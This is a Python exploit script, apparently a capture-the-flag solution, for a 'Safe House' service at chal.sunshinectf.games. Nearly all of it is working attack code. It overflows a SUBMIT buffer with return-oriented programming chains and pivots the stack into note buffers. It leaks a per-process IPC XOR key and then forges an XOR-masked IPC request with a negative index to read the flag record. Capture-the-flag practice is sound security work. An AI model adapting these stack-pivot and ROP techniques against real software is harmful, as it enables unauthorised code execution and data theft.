#!/usr/bin/env python3
"""Safe House exploit: leak IPC XOR key, then forge a negative-index request."""
import os
import select
import socket
import struct
import subprocess
import sys
import time

HOST, PORT = 'chal.sunshinectf.games', 26007
KEY = 0x405060
NOTES = 0x40a180
RET = 0x40101a
POP_RDI = 0x401529
POP_RSI = 0x401dd5
WRITE = 0x401190
MENU = 0x4014d0
REINIT = 0x4014bd
POP_RSP = 0x401dd1
NEWLINE = 0x4030b8


def p64(n):
    return struct.pack('<Q', n)


class Conn:
    def __init__(self, remote):
        if remote:
            self.sock = socket.create_connection((HOST, PORT), timeout=8)
            self.r = self.w = self.sock.fileno()
            self.proc = None
        else:
            argv = ['./service']
            if os.getenv('TRACE'):
                argv = ['strace', '-ff', '-o', 'solve.trace',
                        '-e', 'trace=read,write,exit,exit_group', *argv]
            self.proc = subprocess.Popen(argv, stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE, cwd=os.path.dirname(__file__))
            self.sock = None
            self.r = self.proc.stdout.fileno()
            self.w = self.proc.stdin.fileno()

    def send(self, b):
        if self.sock:
            self.sock.sendall(b)
        else:
            os.write(self.w, b)

    def until(self, marker, timeout=5):
        out = b''
        deadline = time.monotonic() + timeout
        while marker not in out:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(repr(out))
            if not select.select([self.r], [], [], remaining)[0]:
                raise TimeoutError(repr(out))
            b = os.read(self.r, 4096)
            if not b:
                raise EOFError(repr(out))
            out += b
        return out

    def command(self, line):
        self.send(line + b'\n')
        return self.until(b'sh> ')


def rop_write(c, fd, ptrs, pivot=None, buffer=None):
    assert len(ptrs) <= (3 if buffer else 4)
    # Remote libc preserves the length 3 of write("OK\\n"); locally it
    # clobbers RDX to 1. Print a one-byte string to force RDX=1 on both.
    chain = [RET, POP_RDI, NOTES + 4*64, 0x401c20, POP_RDI, fd]
    for ptr in ptrs:
        chain += [POP_RSI, ptr, WRITE]
    if pivot is None:
        chain += [REINIT]
    else:
        chain += [POP_RSP, pivot]
    raw = b'A' * 72 + b''.join(map(p64, chain))
    payload = bytearray(raw.ljust(255 if buffer else max(208, len(raw)), b'B'))
    if buffer is not None:
        # The fake stack after the four writes occupies the tail of this
        # SUBMIT buffer. Its saved endptr address lets NOTE keep working.
        assert pivot == buffer + 216
        payload[216:224] = b'C' * 8
        payload[224:232] = b'D' * 8
        payload[232:240] = p64(REINIT)
        payload[248:255] = p64(buffer + 272)[:7]
    c.send(b'SUBMIT %d\n' % len(payload))
    c.until(b'GO\n')
    c.send(payload)
    return c.until(b'sh> ')


def main():
    c = Conn('--remote' in sys.argv)
    c.until(b'sh> ')

    # Seed a fake stack before leaking the key. The pivot gadget clobbers
    # r13/r14; REINIT reloads their menu-command string pointers.
    fake = NOTES + 6*64
    assert c.command(b'NOTE 6 ' + b'A'*48 + p64(REINIT)) == b'OK\nsh> '
    assert c.command(b'NOTE 7 ' + p64(NOTES + 7*64 + 24)) == b'OK\nsh> '
    assert c.command(b'NOTE 4 X') == b'OK\nsh> '

    # Leak all four bytes of the process-specific IPC XOR key.
    leak = rop_write(c, 1, [KEY + i for i in range(4)], pivot=fake+32)
    assert leak.startswith(b'OK\nX') and leak.endswith(b'sh> '), repr(leak)
    key = leak[4:-4]
    assert len(key) == 4, repr(key)
    print('IPC key:', key.hex(), flush=True)

    # The child trusts index < 16 but does not check index >= 0. Public[-4]
    # aliases the first system record, which stores the flag.
    plain = b'\x03\x00\x04\x00' + struct.pack('<i', -4)
    mask = key[::-1]
    packet = bytes(b ^ mask[i % 4] for i, b in enumerate(plain))
    def stage_bytes(four):
        ptrs = []
        for i, b in enumerate(four):
            if b == 10:
                ptrs.append(NEWLINE)
                continue
            if b == 32:
                # NOTE skips leading spaces, so point one byte into "X ".
                note = b'X '
                ptrs.append(NOTES + i * 64 + 1)
            else:
                note = bytes([b]) if b else b''
                ptrs.append(NOTES + i * 64)
            response = c.command(b'NOTE %d ' % i + note)
            assert response == b'OK\nsh> ', repr(response)
        return ptrs

    # Each staged SUBMIT is limited to three one-byte writes so that its
    # tail still holds a fresh fake stack for the next NOTE/SUBMIT cycle.
    buffer = NOTES + 5*64 + 40  # menu RSP-80 after the initial pivot
    for n, chunk in enumerate((packet[:3], packet[3:4],
                               packet[4:7], packet[7:8])):
        ptrs = stage_bytes(chunk)
        last = n == 3
        response = rop_write(c, 3, ptrs,
                             pivot=None if last else buffer+216,
                             buffer=None if last else buffer)
        print('Stage %d sent:' % (n+1), repr(response), flush=True)
        buffer += 160

    # A normal RELAY receives the queued reply to the forged request.
    # The relay handler performs a single read; let the child finish writing
    # its reply so that header and body arrive together.
    time.sleep(0.1)
    result = c.command(b'RELAY 1')
    print(result.decode('latin-1'), end='', flush=True)


if __name__ == '__main__':
    main()
